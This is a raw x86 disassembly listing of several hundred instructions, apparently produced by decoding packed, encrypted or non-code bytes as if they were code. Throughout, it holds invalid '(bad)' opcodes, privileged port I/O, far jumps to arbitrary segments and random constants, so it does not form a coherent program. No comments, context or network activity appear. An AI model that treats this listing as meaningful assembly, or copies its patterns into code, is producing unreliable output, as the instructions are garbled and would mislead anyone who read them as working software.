  40ecdf:	mov    esi,0x53fd6f34
  40ece4:	push   esi
  40ece5:	nop
  40ece6:	rcl    BYTE PTR [ecx+0x4e14e4a9],1
  40ecec:	push   0xb3a06887
  40ecf1:	jne    0x40ecf1
  40ecf3:	pop    esp
  40ecf4:	outs   dx,DWORD PTR ds:[esi]
  40ecf5:	jge    0x40ed39
  40ecf7:	xchg   ecx,eax
  40ecf8:	sub    bh,dh
  40ecfa:	adc    al,0x39
  40ecfc:	cwde   
  40ecfd:	cdq    
  40ecfe:	jne    0x40ed1f
  40ed00:	aam    0xa8
  40ed02:	mov    bl,0xac
  40ed04:	ja     0x40ed23
  40ed06:	and    DWORD PTR [ebx-0x7cff7838],esi
  40ed0c:	cmp    al,0x3f
  40ed0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed0f:	out    dx,eax
  40ed10:	ficom  DWORD PTR [edx+eax*2-0x279d7e07]
  40ed17:	push   ebx
  40ed18:	and    dl,bl
  40ed1a:	aam    0x84
  40ed1c:	sub    BYTE PTR [edx+ebp*1-0x53cac0cf],ah
  40ed23:	jle    0x40ed4c
  40ed25:	int3   
  40ed26:	test   al,0x3d
  40ed28:	call   0xaa014b7a
  40ed2d:	fisttp DWORD PTR [ecx-0x40edf7e]
  40ed33:	out    0x11,eax
  40ed35:	mov    dh,0x25
  40ed37:	stos   BYTE PTR es:[edi],al
  40ed38:	clc    
  40ed39:	sbb    dh,BYTE PTR [eax+ebx*8-0x5bfc2a7a]
  40ed40:	outs   dx,BYTE PTR ds:[esi]
  40ed41:	add    esi,DWORD PTR [esi]
  40ed43:	fwait
  40ed44:	xchg   ebp,eax
  40ed45:	mov    eax,ds:0xf7215eb2
  40ed4a:	sbb    esi,DWORD PTR [edi]
  40ed4c:	jg     0x40eda2
  40ed4e:	jle    0x40ed57
  40ed50:	data16 (bad) 
  40ed52:	xlat   BYTE PTR ds:[ebx]
  40ed53:	fstp   QWORD PTR ds:0x3f856196
  40ed59:	adc    BYTE PTR [ebp+0x4052aaed],dl
  40ed5f:	mov    dh,0xc1
  40ed61:	xor    eax,0x187fee43
  40ed66:	(bad)  
  40ed67:	jns    0x40ed1b
  40ed69:	call   0xc67ab1bf
  40ed6e:	lods   eax,DWORD PTR ds:[esi]
  40ed6f:	jno    0x40ed92
  40ed71:	test   ebp,esi
  40ed73:	pop    esi
  40ed74:	jns    0x40ed92
  40ed76:	add    al,0xbe
  40ed78:	pop    ss
  40ed79:	aaa    
  40ed7a:	jg     0x40eddb
  40ed7c:	fisub  DWORD PTR [ecx-0x1def98ba]
  40ed82:	adc    DWORD PTR [edi+0x66],ebx
  40ed85:	or     BYTE PTR [edx+edi*2],dh
  40ed88:	sub    ah,BYTE PTR [ecx+edx*1+0x5d2d9276]
  40ed8f:	and    dh,ah
  40ed91:	mov    esi,0x32a1ec2c
  40ed96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed97:	or     ecx,DWORD PTR [esi-0x4cb31475]
  40ed9d:	fist   WORD PTR [ecx+0x33]
  40eda0:	pop    ds
  40eda1:	dec    esi
  40eda2:	inc    eax
  40eda4:	push   ss
  40eda5:	retf   0x48d0
  40eda8:	xchg   ebp,eax
  40eda9:	or     edx,DWORD PTR [eax]
  40edab:	ret    
  40edac:	ins    BYTE PTR es:[edi],dx
  40edad:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40edaf:	ffree  st(0)
  40edb1:	shl    BYTE PTR [edi],cl
  40edb3:	sar    DWORD PTR [edi-0x21],cl
  40edb6:	mov    ds:0x6bcea879,eax
  40edbb:	outs   dx,BYTE PTR ds:[esi]
  40edbc:	xchg   esp,eax
  40edbd:	cwde   
  40edbe:	mov    ds:0x8b034ed8,al
  40edc3:	jl     0x40ed73
  40edc5:	xchg   ecx,esp
  40edc7:	dec    edi
  40edc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edc9:	std    
  40edca:	f2xm1  
  40edcc:	mov    bh,0x87
  40edce:	data16 adc al,0xd2
  40edd1:	shrd   DWORD PTR [edi],ebx,0x49
  40edd5:	imul   edx,DWORD PTR [eax],0xd42ea757
  40eddb:	mov    eax,0xd901ddb4
  40ede0:	mov    dh,0x2d
  40ede2:	dec    ebp
  40ede3:	hlt    
  40ede4:	sbb    DWORD PTR [edx+0x15cbe40],esp
  40edea:	rcr    BYTE PTR [ebx+0x2c],0x16
  40edee:	nop
  40edef:	fimul  WORD PTR [ecx]
  40edf1:	xchg   esi,eax
  40edf2:	gs sbb edi,edi
  40edf5:	and    al,0x1a
  40edf7:	jno    0x40ee5f
  40edf9:	sub    al,0x17
  40edfb:	ins    DWORD PTR es:[edi],dx
  40edfc:	xchg   esp,eax
  40edfd:	cmp    DWORD PTR gs:[eax+ebp*2-0x3530f4f1],edx
  40ee05:	sahf   
  40ee06:	jns    0x40ede0
  40ee08:	fild   DWORD PTR [ecx]
  40ee0a:	jecxz  0x40ee0f
  40ee0c:	cmp    cl,al
  40ee0e:	fstp   DWORD PTR [ecx+0x20]
  40ee11:	fimul  WORD PTR [ecx-0x67b08c19]
  40ee17:	sbb    ebx,DWORD PTR [ebx-0x12c25de8]
  40ee1d:	(bad)  
  40ee1f:	mov    cs,WORD PTR [ebx+0x45]
  40ee22:	into   
  40ee23:	sub    BYTE PTR [edx-0x1d],al
  40ee26:	jne    0x40ee95
  40ee28:	pop    edx
  40ee29:	arpl   WORD PTR [ecx],di
  40ee2b:	shl    DWORD PTR [edx+0x4b],cl
  40ee2e:	push   0x2
  40ee30:	jbe    0x40eded
  40ee32:	sub    dh,BYTE PTR [esi-0x1e]
  40ee35:	sub    edx,DWORD PTR [ebx+eiz*2+0x3413791]
  40ee3c:	sbb    DWORD PTR [ebx],esi
  40ee3e:	pusha  
  40ee3f:	jecxz  0x40ee8d
  40ee41:	jl     0x40edcc
  40ee43:	arpl   WORD PTR [eax],sp
  40ee45:	fdiv   QWORD PTR [ecx+edi*8-0x79]
  40ee49:	mov    ebp,0x8e09c359
  40ee4e:	js     0x40edd7
  40ee50:	cs jmp 0x40ee91
  40ee53:	dec    ebx
  40ee54:	in     eax,dx
  40ee55:	call   0x255e:0x37947932
  40ee5c:	iret   
  40ee5d:	imul   edx,DWORD PTR [ebx-0x2e],0x5ebb8302
  40ee64:	xchg   ebp,eax
  40ee65:	jno    0x40ee69
  40ee67:	ss test eax,0x74b5e75
  40ee6d:	cs xchg edx,eax
  40ee6f:	cwde   
  40ee70:	pop    ebp
  40ee71:	mov    edi,0x4b42ae1a
  40ee76:	add    al,0x81
  40ee78:	das    
  40ee79:	(bad)  
  40ee7a:	xor    cl,cl
  40ee7c:	or     al,0xed
  40ee7e:	push   ebx
  40ee7f:	fsubr  QWORD PTR [ebx+0x37]
  40ee82:	popa   
  40ee83:	inc    eax
  40ee84:	jno    0x40ee91
  40ee86:	push   es
  40ee87:	sbb    BYTE PTR [esi+0x14],cl
  40ee8a:	mov    cl,0x8d
  40ee8c:	xchg   DWORD PTR [eax+0x6ed6791a],ebx
  40ee92:	inc    esp
  40ee93:	push   edi
  40ee94:	adc    eax,0xf6c79c10
  40ee99:	neg    BYTE PTR [eax+0x1ab9d0c5]
  40ee9f:	ja     0x40eeb6
  40eea1:	dec    esi
  40eea2:	clc    
  40eea3:	(bad)  
  40eea4:	clc    
  40eea5:	sbb    al,0x25
  40eea7:	lahf   
  40eea8:	leave  
  40eea9:	and    BYTE PTR [edi+0x7c],0x82
  40eead:	int3   
  40eeae:	sub    DWORD PTR [ebx+0x3b7624fd],0xe825aeb1
  40eeb8:	test   al,0x85
  40eeba:	mov    ah,0x10
  40eebc:	mov    al,0x4f
  40eebe:	ss pop ds
  40eec0:	rcr    DWORD PTR [edx-0x1f],cl
  40eec3:	adc    esp,DWORD PTR [ecx+0x7631ced0]
  40eec9:	ror    DWORD PTR [ebx-0x45],0xa3
  40eecd:	xlat   BYTE PTR ds:[ebx]
  40eece:	xchg   esp,eax
  40eecf:	xor    al,0x3d
  40eed1:	mov    BYTE PTR [eax+0x58],0xdd
  40eed5:	pop    ebp
  40eed6:	mov    ds:0x41157f17,eax
  40eedb:	(bad)  
  40eedd:	add    BYTE PTR [esi],bh
  40eedf:	xor    ecx,edi
  40eee1:	fisub  DWORD PTR [ecx+0x38215f]
  40eee7:	ins    DWORD PTR es:[edi],dx
  40eee8:	sbb    dl,0x81
  40eeeb:	sub    eax,0xc2051587
  40eef0:	xchg   ebx,eax
  40eef1:	and    ebx,ebp
  40eef3:	xchg   ecx,eax
  40eef4:	shr    BYTE PTR [eax-0x16],1
  40eef7:	mov    edx,0x48a70dc1
  40eefc:	cdq    
  40eefd:	out    dx,al
  40eefe:	das    
  40eeff:	lds    ecx,FWORD PTR [ecx*4+0x70cca09f]
  40ef06:	sti    
  40ef07:	xor    eax,0xe51900f8
  40ef0c:	in     eax,dx
  40ef0d:	retf   0x92e1
  40ef10:	jmp    0x2d062e3b
  40ef15:	lds    ecx,FWORD PTR [ecx+0x68237c1e]
  40ef1b:	and    eax,0x113da8d5
  40ef20:	clc    
  40ef21:	rol    DWORD PTR [ebx+0x76242cda],cl
  40ef27:	jp     0x40ef88
  40ef29:	push   edi
  40ef2a:	inc    ebx
  40ef2b:	mov    dh,0xf5
  40ef2d:	xchg   ebp,eax
  40ef2e:	fisub  DWORD PTR [ecx-0x5ed4b611]
  40ef34:	push   esi
  40ef35:	lods   eax,DWORD PTR ds:[esi]
  40ef36:	mov    edi,0x5dc4b067
  40ef3b:	xor    BYTE PTR [esi],al
  40ef3d:	fcmove st,st(7)
  40ef3f:	or     dh,cl
  40ef41:	idiv   BYTE PTR [edx]
  40ef43:	adc    BYTE PTR [ebp+0x2c0f3a15],dh
  40ef49:	bnd jl 0x40eed2
  40ef4c:	mov    cl,BYTE PTR [eax-0x1]
  40ef4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef50:	mov    al,ds:0xcbea2386
  40ef55:	xor    DWORD PTR [edi+ebp*8-0x3],ebx
  40ef59:	stc    
  40ef5a:	adc    BYTE PTR [esi],al
  40ef5c:	sbb    al,BYTE PTR ds:0x6a4fa508
  40ef62:	or     BYTE PTR [edx-0x60421345],cl
  40ef68:	sbb    DWORD PTR [ebp-0x18c08365],edx
  40ef6e:	ret    0xd281
  40ef71:	ins    BYTE PTR es:[edi],dx
  40ef72:	xor    esp,DWORD PTR [ecx]
  40ef74:	fisub  WORD PTR [edx+0x6f502b05]
  40ef7a:	test   BYTE PTR [ecx],dl
  40ef7c:	aaa    
  40ef7d:	arpl   WORD PTR ds:0x4d1820e,ax
  40ef83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef84:	rcl    DWORD PTR [edi],1
  40ef86:	lock xchg edi,eax
  40ef88:	ret    
  40ef89:	mov    ecx,0x6cbec0b8
  40ef8e:	(bad)  
  40ef90:	jae    0x40ef91
  40ef92:	inc    edx
  40ef93:	pop    esi
  40ef94:	sub    eax,0x4bebb636
  40ef99:	repnz scas eax,DWORD PTR es:[edi]
  40ef9b:	pop    esi
  40ef9c:	lahf   
  40ef9d:	add    DWORD PTR [ebx],edi
  40ef9f:	mov    bh,0x8f
  40efa1:	(bad)  
  40efa2:	mov    bh,0xf2
  40efa4:	add    ch,ch
  40efa6:	jns    0x40f022
  40efa8:	sub    edx,DWORD PTR [eax]
  40efaa:	(bad)  
  40efab:	ds pop ss
  40efad:	hlt    
  40efae:	inc    ebx
  40efaf:	and    esp,edx
  40efb1:	xchg   ecx,eax
  40efb2:	inc    ebp
  40efb3:	push   esi
  40efb4:	test   DWORD PTR [ecx+0x6e],ecx
  40efb7:	sbb    al,0x9b
  40efb9:	inc    esi
  40efba:	cld    
  40efbb:	add    DWORD PTR [ebx+0x74],0x31bac975
  40efc2:	ficom  WORD PTR [eax-0x3e]
  40efc5:	jmp    0xa3fb:0x70b4a2f3
  40efcc:	aad    0x4a
  40efce:	mov    esi,0x4265b009
  40efd3:	xor    DWORD PTR [eax+eiz*1],ebp
  40efd6:	and    bh,dh
  40efd8:	jmp    0xb001e525
  40efdd:	push   esp
  40efde:	fs push 0xffffffa8
  40efe1:	add    al,al
  40efe3:	inc    edx
  40efe4:	into   
  40efe5:	fnstenv [ecx]
  40efe7:	(bad)  
  40efe8:	call   0x9751df1
  40efed:	gs dec esp
  40efef:	xchg   dl,bl
  40eff1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40eff3:	jle    0x40f04e
  40eff5:	hlt    
  40eff6:	push   0xaf07e2ba
  40effb:	mov    cl,BYTE PTR [edx+eax*1+0x18]
  40efff:	ror    DWORD PTR [ecx-0x4d],1
  40f002:	or     eax,0xc78c940d
  40f007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f008:	(bad)  
  40f009:	or     al,BYTE PTR [ebp+0x6e5ea754]
  40f00f:	inc    esp
  40f010:	stos   BYTE PTR es:[edi],al
  40f011:	and    edx,edx
  40f013:	mov    ch,0x9c
  40f015:	sar    BYTE PTR ds:0x1cf60c88,1
  40f01b:	xchg   ecx,eax
  40f01c:	neg    DWORD PTR [esi+0x8736985]
  40f022:	jl     0x40f076
  40f024:	and    al,0x75
  40f026:	dec    esp
  40f027:	es and eax,0x29d24ddc
  40f02d:	sbb    DWORD PTR [ecx+0x20de0154],ebp
  40f033:	call   0x7c2e:0x3e5d667b
  40f03a:	int    0xcb
  40f03c:	pop    ebp
  40f03d:	or     ebx,DWORD PTR [esi+0x3c]
  40f040:	mov    ch,0x8a
  40f042:	or     eax,0x30994760
  40f047:	sub    al,0xcd
  40f04a:	inc    esi
  40f04b:	int    0x23
  40f04d:	add    ah,BYTE PTR [ecx]
  40f04f:	sbb    eax,0x6abcfd9f
  40f054:	int3   
  40f055:	jnp    0x40efea
  40f057:	sti    
  40f058:	into   
  40f059:	in     eax,dx
  40f05a:	sbb    al,0x98
  40f05c:	mov    ecx,0x232680d2
  40f061:	jo     0x40f0b0
  40f063:	(bad)  
  40f064:	je     0x40f04f
  40f066:	mov    esi,0x325f3f9c
  40f06b:	add    eax,0xc0e71593
  40f070:	fisubr WORD PTR [ecx+0x26b55c8f]
  40f076:	mov    al,0xe7
  40f078:	outs   dx,BYTE PTR ds:[esi]
  40f079:	mov    ss,WORD PTR [ebx+0x22]
  40f07c:	popa   
  40f07d:	mov    eax,ds:0x89a58ecc
  40f082:	jne    0x40f02a
  40f084:	sar    BYTE PTR [edx],cl
  40f086:	jge    0x40f0f5
  40f088:	leave  
  40f089:	popa   
  40f08a:	mov    bl,0x40
  40f08c:	mov    edi,0x35e61b51
  40f091:	sub    BYTE PTR [edx],bl
  40f093:	mov    ecx,0x79ae32e3
  40f098:	test   edx,ebx
  40f09a:	data16 cs std 
  40f09d:	aam    0x3c
  40f09f:	jge    0x40f03e
  40f0a1:	jmp    0x58f8:0x883278bb
  40f0a8:	cmp    bh,al
  40f0aa:	repnz lock xor al,0x58
  40f0ae:	jnp    0x40f09d
  40f0b0:	push   ds
  40f0b1:	test   al,0x74
  40f0b3:	push   ebx
  40f0b4:	cmp    BYTE PTR [esi+0xf0db21],dh
  40f0ba:	dec    edi
  40f0bb:	stos   DWORD PTR es:[edi],eax
  40f0bc:	sbb    esi,ecx
  40f0be:	cmp    ebp,0xffffffa8
  40f0c1:	xchg   esp,eax
  40f0c2:	mov    ebp,0x58eeaf99
  40f0c7:	push   esp
  40f0c8:	dec    esp
  40f0c9:	or     al,0xb4
  40f0cb:	ret    0x43cb
  40f0ce:	lods   eax,DWORD PTR ds:[esi]
  40f0cf:	lods   eax,DWORD PTR ds:[esi]
  40f0d0:	stc    
  40f0d1:	arpl   WORD PTR [eax],ax
  40f0d3:	adc    ah,BYTE PTR ds:0x40bdcd62
  40f0d9:	xchg   edx,eax
  40f0da:	cmp    DWORD PTR [bx+si-0x2d20],eax
  40f0df:	mov    ds:0x583110f3,al
  40f0e4:	std    
  40f0e5:	adc    eax,0x1bbed190
  40f0ea:	iret   
  40f0eb:	mov    cl,0xa0
  40f0ed:	xchg   DWORD PTR [esi+0xea4a71c],esi
  40f0f3:	jl     0x40f133
  40f0f5:	adc    BYTE PTR [ebp+0x68],al
  40f0f8:	fadd   DWORD PTR [eax+esi*4]
  40f0fb:	popa   
  40f0fc:	in     eax,0xf9
  40f0fe:	cwde   
  40f0ff:	mov    ds:0x932b9472,eax
  40f104:	jge    0x40f179
  40f106:	push   edi
  40f107:	push   eax
  40f108:	adc    al,BYTE PTR [ecx+ecx*8]
  40f10b:	ss sub edi,edx
  40f10e:	sbb    eax,0x7e1d341e
  40f113:	jecxz  0x40f0a9
  40f115:	adc    al,0xb6
  40f117:	xchg   BYTE PTR [ebp+0x17],al
  40f11a:	add    DWORD PTR [esi-0x42e04fdb],esp
  40f120:	mov    ebp,0xf19ae86f
  40f125:	add    DWORD PTR [esi],ecx
  40f127:	cld    
  40f128:	(bad)  
  40f129:	arpl   WORD PTR [ebx+0x390a3c0e],bx
  40f12f:	shl    DWORD PTR [edx+0x33],0xcb
  40f133:	(bad)  
  40f134:	pop    es
  40f135:	pusha  
  40f136:	inc    ecx
  40f137:	jp     0x40f10c
  40f139:	cli    
  40f13a:	pop    ss
  40f13b:	pop    ss
  40f13c:	sbb    ebx,DWORD PTR [ebp+0x34a18ecc]
  40f142:	sbb    DWORD PTR [edi],ebp
  40f144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f145:	pop    eax
  40f146:	sub    dl,BYTE PTR [ebx]
  40f148:	jmp    0xd4ce:0x15a80376
  40f14f:	ret    
  40f150:	out    dx,al
  40f151:	mov    esi,DWORD PTR [esi+edx*1]
  40f154:	call   0x2ec2:0x49a72666
  40f15b:	ss aam 0x21
  40f15e:	or     eax,0x2dee2ebf
  40f163:	test   al,0xf8
  40f165:	push   ebx
  40f166:	data16 jnp 0x40f152
  40f169:	(bad)  
  40f16a:	fnstcw WORD PTR [esi-0x3364058f]
  40f170:	xchg   ecx,eax
  40f171:	mov    ds:0x3724ce2c,al
  40f176:	dec    ecx
  40f177:	aas    
  40f178:	data16 and bl,BYTE PTR [esi]
  40f17b:	les    esi,FWORD PTR [edx+0x7b8bf061]
  40f181:	xor    edx,DWORD PTR [edx+0x40]
  40f184:	and    ecx,ecx
  40f186:	shr    DWORD PTR [ebx-0x47],0x5e
  40f18a:	push   eax
  40f18b:	dec    sp
  40f18d:	sub    cl,BYTE PTR [eax-0x58fd3a67]
  40f193:	xchg   esi,eax
  40f194:	jno    0x40f149
  40f196:	pop    edx
  40f197:	push   esp
  40f198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f199:	hlt    
  40f19a:	xor    DWORD PTR [edx-0x37],ebx
  40f19d:	adc    bh,BYTE PTR [edx-0x6a6078e8]
  40f1a3:	fstp   TBYTE PTR [eax-0x8]
  40f1a6:	ficomp WORD PTR [esi]
  40f1a8:	imul   eax,DWORD PTR [ebx],0xffffffc3
  40f1ab:	stos   BYTE PTR es:[edi],al
  40f1ac:	or     edx,DWORD PTR [edx+0x48]
  40f1af:	push   edx
  40f1b0:	popa   
  40f1b1:	inc    edi
  40f1b2:	outs   dx,DWORD PTR ds:[esi]
  40f1b3:	and    ebx,ebx
  40f1b5:	(bad)  
  40f1b6:	cld    
  40f1b7:	call   0x8ddf:0xae6d5059
  40f1be:	xor    bh,BYTE PTR [edi-0x15]
  40f1c1:	push   edi
  40f1c2:	pop    esp
  40f1c3:	pop    edi
  40f1c4:	fcomp  QWORD PTR [edi-0x20025015]
  40f1ca:	inc    ebp
  40f1cb:	mov    ecx,db1
  40f1ce:	push   0xffffffbc
  40f1d0:	clc    
  40f1d1:	sbb    eax,0x64322632
  40f1d6:	arpl   WORD PTR [eax-0x9646c8c],di
  40f1dc:	aaa    
  40f1dd:	ins    BYTE PTR es:[edi],dx
  40f1de:	or     eax,0x21aa7a36
  40f1e3:	inc    edi
  40f1e4:	ret    0x818b
  40f1e7:	sbb    ah,dl
  40f1e9:	imul   esp,esp,0x8812a88f
  40f1ef:	int    0xb5
  40f1f1:	jmp    0x40f1c4
  40f1f3:	jmp    DWORD PTR [edi]
  40f1f5:	test   BYTE PTR [esp+ebx*4],dl
  40f1f8:	or     al,0xc8
  40f1fa:	das    
  40f1fb:	sub    edi,DWORD PTR [edx+0x59ee42d6]
  40f201:	(bad)  
  40f202:	icebp  
  40f203:	adc    eax,0x541b93cf
  40f208:	adc    edi,ecx
  40f20a:	cmp    ecx,DWORD PTR [edx]
  40f20c:	add    eax,0x7b86c509
  40f211:	or     al,0xed
  40f213:	fsubr  DWORD PTR [esi+edx*4-0x6bf14b7f]
  40f21a:	cmp    DWORD PTR [ebp+edx*1-0x47efb5ee],esi
  40f221:	and    BYTE PTR [ebx],bl
  40f223:	add    BYTE PTR [edi+0x67],al
  40f226:	stos   DWORD PTR es:[edi],eax
  40f227:	lea    edx,[edx-0x1f]
  40f22a:	jne    0x40f2a9
  40f22c:	mov    DWORD PTR [esi],esp
  40f22e:	pop    edx
  40f22f:	sub    eax,0x5cd20723
  40f234:	hlt    
  40f235:	test   al,0xf0
  40f237:	mov    ah,0xfc
  40f239:	mov    eax,0xc52e4e86
  40f23e:	cmp    al,0x16
  40f240:	mov    DWORD PTR [edx-0x2b],edx
  40f243:	or     cl,BYTE PTR [esi+esi*1+0x63f3870a]
  40f24a:	mov    eax,0x93948d90
  40f24f:	push   eax
  40f250:	mov    dl,0xb3
  40f252:	das    
  40f253:	retf   
  40f254:	icebp  
  40f255:	mov    ?,WORD PTR [edx]
  40f257:	sbb    eax,0x85babd06
  40f25c:	stos   DWORD PTR es:[edi],eax
  40f25d:	shr    edi,1
  40f25f:	(bad)  
  40f261:	xor    BYTE PTR [edx-0x4e4bb664],ah
  40f267:	outs   dx,BYTE PTR ds:[esi]
  40f268:	int    0x19
  40f26a:	lods   al,BYTE PTR ds:[esi]
  40f26b:	jae    0x40f284
  40f26d:	and    DWORD PTR [ecx+0x1ec8e0e6],ebp
  40f273:	ja     0x40f283
  40f275:	hlt    
  40f276:	mov    edi,0x7bcb4b29
  40f27b:	fscale 
  40f27d:	or     esp,edx
  40f27f:	call   0xe16e1c6a
  40f284:	cs pop es
  40f286:	mov    DWORD PTR ds:0xa13b874e,esi
  40f28c:	add    dh,BYTE PTR [ecx+0x996c226]
  40f292:	pop    ss
  40f293:	lods   eax,DWORD PTR ds:[esi]
  40f294:	outs   dx,BYTE PTR ds:[esi]
  40f295:	xchg   edi,eax
  40f296:	pusha  
  40f297:	inc    ebp
  40f298:	jns    0x40f2e0
  40f29a:	fld    DWORD PTR [edx+0x5c14a9fe]
  40f2a0:	push   ds
  40f2a1:	jle    0x40f2f4
  40f2a3:	mov    ebx,0x31506fcf
  40f2a8:	mov    edi,0x34286fa0
  40f2ad:	dec    edx
  40f2ae:	imul   eax,DWORD PTR [edx-0x331123f2],0x23d5498c
  40f2b8:	(bad)  
  40f2b9:	push   ebp
  40f2ba:	xor    al,0x77
  40f2bc:	shr    BYTE PTR [edx-0x39],1
  40f2bf:	ret    0x2e78
  40f2c2:	push   ebx
  40f2c3:	xlat   BYTE PTR gs:[ebx]
  40f2c5:	cdq    
  40f2c6:	gs dec edi
  40f2c8:	test   DWORD PTR [edi],edx
  40f2ca:	aad    0xa3
  40f2cc:	cmp    eax,0x49df6afe
  40f2d1:	fldcw  WORD PTR [edx-0x25]
  40f2d4:	and    edx,ebx
  40f2d6:	js     0x40f33b
  40f2d8:	xchg   ecx,eax
  40f2d9:	dec    ebx
  40f2da:	push   cs
  40f2db:	adc    BYTE PTR [edx],ah
  40f2dd:	add    al,0x24
  40f2df:	pop    edi
  40f2e0:	mov    WORD PTR gs:[esi],fs
  40f2e3:	loope  0x40f335
  40f2e5:	ret    
  40f2e6:	add    DWORD PTR [esi-0x4d],0xc369e506
  40f2ed:	xchg   esp,eax
  40f2ee:	sub    DWORD PTR [edx-0xf],edi
  40f2f1:	stos   BYTE PTR es:[edi],al
  40f2f2:	cdq    
  40f2f3:	fidiv  DWORD PTR [edx+0x2f]
  40f2f6:	pop    ebp
  40f2f7:	jp     0x40f2db
  40f2f9:	inc    esi
  40f2fa:	jo     0x40f2d6
  40f2fc:	mov    WORD PTR [esi+0x575bfda6],?
  40f302:	cwde   
  40f303:	fistp  QWORD PTR [ebx-0x1e]
  40f306:	int    0xab
  40f308:	addr16 gs popa 
  40f30b:	dec    esi
  40f30c:	xchg   DWORD PTR [edi],ebp
  40f30e:	xor    eax,0xdd893893
  40f313:	jns    0x40f29d
  40f315:	xchg   edx,eax
  40f316:	pop    es
  40f317:	mov    eax,ds:0xb6599739
  40f31c:	mov    esp,0x91a0657
  40f321:	sub    eax,esi
  40f323:	nop
  40f324:	pop    ds
  40f325:	xchg   DWORD PTR [edi-0x71],edx
  40f328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f329:	lahf   
  40f32a:	or     esi,DWORD PTR [ebx]
  40f32c:	inc    ebp
  40f32d:	outs   dx,DWORD PTR ds:[esi]
  40f32e:	cmp    eax,DWORD PTR [ecx+0x53]
  40f331:	(bad)  
  40f333:	cmp    BYTE PTR [ebx-0x452994ca],dl
  40f339:	sbb    esp,DWORD PTR [edx+0x77b04856]
  40f33f:	loope  0x40f32a
  40f341:	in     eax,dx
  40f342:	pop    ss
  40f343:	dec    ecx
  40f344:	inc    eax
  40f345:	popa   
  40f346:	nop
  40f347:	or     esi,DWORD PTR [edx+0xd]
  40f34a:	les    esi,FWORD PTR [esi-0x646f0374]
  40f350:	out    0x6f,al
  40f352:	test   eax,0xd240c458
  40f357:	js     0x40f3ac
  40f359:	cmp    DWORD PTR [esi],eax
  40f35b:	jbe    0x40f39a
  40f35d:	mov    al,ds:0x8cf04927
  40f362:	xor    DWORD PTR [ebx],esi
  40f364:	test   ebp,edx
  40f366:	push   edx
  40f367:	or     edx,DWORD PTR [ebx-0x51]
  40f36a:	outs   dx,DWORD PTR ds:[esi]
  40f36b:	cld    
  40f36c:	loop   0x40f3e6
  40f36e:	stos   DWORD PTR es:[edi],eax
  40f36f:	ja     0x40f350
  40f371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f372:	inc    ah
  40f374:	jae    0x40f3ce
  40f376:	rol    BYTE PTR ds:0xa2b4e7cc,1
  40f37c:	shr    BYTE PTR [eax],1
  40f37e:	stc    
  40f37f:	sahf   
  40f380:	jg     0x40f337
  40f382:	sub    al,0x1f
  40f384:	fcomp  QWORD PTR [edi+0x1597884f]
  40f38a:	push   es
  40f38b:	xor    ecx,DWORD PTR [ebp+0x719f68]
  40f391:	xchg   edx,eax
  40f392:	cs in  al,dx
  40f394:	fistp  DWORD PTR [ecx]
  40f396:	pop    ds
  40f397:	dec    ecx
  40f398:	clc    
  40f399:	xor    BYTE PTR [edi-0x2e38fcbd],dl
  40f39f:	adc    esi,DWORD PTR [ecx]
  40f3a1:	fmul   DWORD PTR [ecx]
  40f3a3:	push   DWORD PTR [eax-0x36]
  40f3a6:	mov    ecx,0xe1d66d91
  40f3ab:	fild   QWORD PTR [edx-0x60b24c28]
  40f3b1:	retf   0xee72
  40f3b4:	pop    esi
  40f3b5:	sub    ebp,DWORD PTR [esp+edx*8+0x1f]
  40f3b9:	loope  0x40f3cc
  40f3bb:	add    eax,0xffb2cfa1
  40f3c0:	(bad)  
  40f3c1:	cmp    DWORD PTR [edx-0x19],ebx
  40f3c4:	fwait
  40f3c5:	ret    0x2cad
  40f3c8:	jo     0x40f359
  40f3ca:	scas   eax,DWORD PTR es:[edi]
  40f3cb:	iret   
  40f3cc:	jp     0x40f359
  40f3ce:	push   0xffffff94
  40f3d0:	ret    
  40f3d1:	aaa    
  40f3d2:	mov    edx,0x300b656c
  40f3d7:	pushf  
  40f3d8:	loop   0x40f387
  40f3da:	(bad)  
  40f3dc:	arpl   WORD PTR [ebp+0x30a10267],si
  40f3e2:	push   ss
  40f3e3:	iret   
  40f3e4:	inc    esp
  40f3e5:	push   es
  40f3e6:	adc    BYTE PTR [esi+ebx*2+0x1966034f],cl
  40f3ed:	in     al,0x2
  40f3ef:	lods   eax,DWORD PTR ds:[esi]
  40f3f0:	inc    edx
  40f3f1:	fs inc ebx
  40f3f3:	popa   
  40f3f4:	imul   ch
  40f3f6:	mov    esi,0x3ebc7408
  40f3fb:	js     0x40f393
  40f3fd:	lock pop ebp
  40f3ff:	data16 adc al,0xdc
  40f402:	repz mov ebx,0x260cc8f
  40f408:	pop    edi
  40f409:	mov    dh,0x2
  40f40b:	mov    ebx,DWORD PTR [ebx+0x31479125]
  40f411:	jle    0x40f434
  40f413:	cmp    ecx,DWORD PTR [ebp+0x5b2fce5f]
  40f419:	mov    eax,0xdffb05d9
  40f41e:	pop    eax
  40f41f:	cmp    BYTE PTR [ecx+0x65c31be6],0xee
  40f426:	das    
  40f427:	aas    
  40f428:	cmc    
  40f429:	in     eax,dx
  40f42a:	mov    eax,ds:0xe6512931
  40f42f:	jns    0x40f40f
  40f431:	popa   
  40f432:	call   0xe1375fc6
  40f437:	push   0xdb4e0da1
  40f43c:	xlat   BYTE PTR ds:[ebx]
  40f43d:	lods   eax,DWORD PTR ds:[esi]
  40f43e:	mov    edi,0x52ccbd78
  40f443:	dec    esi
  40f444:	xor    ebp,ebp
  40f446:	jp     0x40f46b
  40f448:	or     esi,ecx
  40f44a:	adc    DWORD PTR [eax-0x1b],esp
  40f44d:	stc    
  40f44e:	imul   edi,DWORD PTR [edx-0x2e],0xb3f59e71
  40f455:	outs   dx,DWORD PTR ds:[esi]
  40f456:	arpl   WORD PTR [eax+0x79],si
  40f459:	adc    eax,0x5f73c928
  40f45e:	loop   0x40f3fb
  40f460:	jne    0x40f44d
  40f462:	jmp    0xced8cf74
